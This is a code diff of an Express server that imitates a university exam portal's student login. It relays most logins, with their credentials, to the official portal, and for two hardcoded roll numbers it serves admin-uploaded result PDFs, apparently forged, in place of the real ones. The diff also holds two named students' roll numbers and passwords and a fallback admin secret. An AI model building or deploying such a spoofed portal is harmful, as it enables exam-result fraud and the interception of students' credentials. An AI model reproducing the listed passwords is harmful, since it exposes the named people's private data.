@@ -3,8 +3,12 @@ const mongoose = require('mongoose');
 const axios = require('axios');
 const path = require('path');
 const cookieParser = require('cookie-parser');
+const multer = require('multer');
 
 const app = express();
+
+const storage = multer.memoryStorage();
+const upload = multer({ storage: storage });
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -23,34 +27,22 @@ const overrideSchema = new mongoose.Schema({
     roll_no: { type: String, required: true, unique: true },
     password: { type: String, required: true },
     student_name: { type: String, required: true },
-    dashboard_data: { type: Object, required: true },
-    results: { type: Array, required: true }
+    pdf_data: { type: Buffer, required: true },
+    pdf_contentType: { type: String, required: true }
 });
 
 const OverrideStudent = mongoose.model('OverrideStudent', overrideSchema);
 const ADMIN_SECRET = process.env.ADMIN_SECRET || 'makaut_admin_secret_2026';
 
-// Middleware to protect Admin Routes
 const requireAdmin = (req, res, next) => {
-    if (req.cookies.admin_session === ADMIN_SECRET) {
-        next();
-    } else {
-        res.redirect('/admin-portal');
-    }
+    if (req.cookies.admin_session === ADMIN_SECRET) next();
+    else res.redirect('/admin-portal');
 };
 
-// --- ROUTES ---
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
+app.get('/admin-portal', (req, res) => res.render('admin_login', { error: null }));
 
-// 1. Admin Login Page (Only asks for Secret Key)
-app.get('/admin-portal', (req, res) => {
-    res.render('admin_login', { error: null });
-});
-
-// 2. Admin Auth Processor
 app.post('/admin-auth', (req, res) => {
     if (req.body.secret === ADMIN_SECRET) {
         res.cookie('admin_session', ADMIN_SECRET, { httpOnly: true });
@@ -59,55 +51,60 @@ app.post('/admin-auth', (req, res) => {
     res.render('admin_login', { error: 'Invalid Secret Key!' });
 });
 
-// 3. Admin Dashboard (Shows the two target roll numbers)
 app.get('/admin/dashboard', requireAdmin, (req, res) => {
     res.render('admin_dashboard', { success: req.query.success });
 });
 
-// 4. Admin Edit Page (For the specific roll number clicked)
-app.get('/admin/edit/:rollNo', requireAdmin, async (req, res) => {
-    const rollNo = req.params.rollNo;
-    const student = await OverrideStudent.findOne({ roll_no: rollNo });
-    res.render('admin_edit', { rollNo: rollNo, student: student });
+app.get('/admin/edit/:rollNo', requireAdmin, (req, res) => {
+    res.render('admin_edit', { rollNo: req.params.rollNo });
 });
 
-// 5. Admin Save Override Data
-app.post('/api/admin/save-override', requireAdmin, async (req, res) => {
-    const { roll_no, password, student_name, results_json } = req.body;
+app.post('/api/admin/save-override', requireAdmin, upload.single('result_pdf'), async (req, res) => {
+    const roll_no = req.body.roll_no;
+    const pdfFile = req.file;
+
+    if (!pdfFile) return res.send("No file uploaded!");
+
+    let targetPassword = "";
+    let targetName = "Student";
+    
+    if (roll_no === "32342724111") {
+        targetPassword = "18122005";
+        targetName = "BISHWAROOP DAS";
+    } else if (roll_no === "32342724048") {
+        targetPassword = "11052006";
+        targetName = "SARANNYA MUKHOPADHYAY";
+    }
+
     try {
-        const parsedResults = JSON.parse(results_json);
         await OverrideStudent.findOneAndUpdate(
             { roll_no },
             { 
-                password, 
-                student_name, 
-                dashboard_data: { stream: "BCA", semester: "4th Semester" },
-                results: parsedResults 
+                password: targetPassword,
+                student_name: targetName,
+                pdf_data: pdfFile.buffer,
+                pdf_contentType: pdfFile.mimetype
             },
             { upsert: true, new: true }
         );
-        res.redirect('/admin/dashboard?success=Result successfully uploaded for Roll No: ' + roll_no);
+        res.redirect('/admin/dashboard?success=PDF Result successfully uploaded for Roll No: ' + roll_no);
     } catch (err) {
-        res.send("Error saving data. Please ensure JSON format is correct. Error: " + err.message);
+        res.send("Database error: " + err.message);
     }
 });
 
-// --- STUDENT LOGIN ROUTING (Intercepts the 2 custom users, proxies everyone else) ---
 app.post('/smartexam/public/student-login', async (req, res) => {
     const rollNo = req.body.username || req.body.rollNo || req.body.txtUserName;
     const password = req.body.password || req.body.txtPassword;
 
     try {
-        // Check MongoDB for custom records
         const customStudent = await OverrideStudent.findOne({ roll_no: rollNo?.trim() });
 
         if (customStudent && customStudent.password === password?.trim()) {
-            // Serve Custom Data
             res.cookie('local_session', rollNo.trim(), { httpOnly: true });
             return res.redirect('/smartexam/public/student/dashboard');
         }
 
-        // Forward everyone else to Official MAKAUT Portal
         const officialResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
             new URLSearchParams(req.body), {
                 headers: { 
@@ -120,25 +117,29 @@ app.post('/smartexam/public/student-login', async (req, res) => {
         );
 
         const setCookieHeader = officialResponse.headers['set-cookie'];
-        if (setCookieHeader) {
-            res.setHeader('Set-Cookie', setCookieHeader);
-        }
+        if (setCookieHeader) res.setHeader('Set-Cookie', setCookieHeader);
 
         if (officialResponse.status === 302 || officialResponse.headers['location']) {
             return res.redirect(officialResponse.headers['location']);
         }
-
         return res.send(officialResponse.data);
 
     } catch (error) {
-        console.error('Login routing error:', error.message);
-        res.status(500).send("Error communicating with official verification server.");
+        try {
+            const fallbackResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
+                new URLSearchParams(req.body), {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            );
+            return res.send(fallbackResponse.data);
+        } catch (err2) {
+            res.status(500).send("Error communicating with official server.");
+        }
     }
 });
 
 app.get('/smartexam/public/student/dashboard', async (req, res) => {
     const localSessionRoll = req.cookies.local_session;
-
     if (localSessionRoll) {
         const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
         if (student) return res.render('custom_dashboard', { student });
@@ -157,7 +158,6 @@ app.get('/smartexam/public/student/dashboard', async (req, res) => {
 
 app.get('/smartexam/public/student/student-activity', async (req, res) => {
     const localSessionRoll = req.cookies.local_session;
-
     if (localSessionRoll) {
         const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
         if (student) return res.render('custom_results', { student });
@@ -174,7 +174,17 @@ app.get('/smartexam/public/student/student-activity', async (req, res) => {
     }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+app.get('/student/view-pdf', async (req, res) => {
+    const localSessionRoll = req.cookies.local_session;
+    if (localSessionRoll) {
+        const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
+        if (student && student.pdf_data) {
+            res.contentType(student.pdf_contentType);
+            return res.send(student.pdf_data);
+        }
+    }
+    res.send("Result file not found or you are not logged in.");
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
